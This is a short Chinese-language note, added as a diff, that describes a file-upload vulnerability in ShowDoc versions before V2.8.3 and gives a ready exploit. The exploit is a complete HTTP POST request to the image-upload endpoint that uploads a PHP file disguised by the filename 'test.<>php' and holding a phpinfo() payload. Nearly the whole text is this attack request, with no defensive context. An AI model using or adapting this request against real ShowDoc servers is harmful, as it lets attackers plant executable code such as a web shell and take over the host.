@@ -1,0 +1,17 @@
+ShowDoc存在一个上传漏洞的位置
+ShowDoc < V2.8.3都可利用
+
+EXP：
+POST /Pass-22/index.php?s=/home/page/uploadImg HTTP/1.1
+Host: 192.168.3.99
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Content-Length: 241
+Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
+Accept-Encoding: gzip
+
+----------------------------921378126371623762173617
+Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+Content-Type: text/plain
+
+<?php phpinfo();?>
+----------------------------921378126371623762173617--
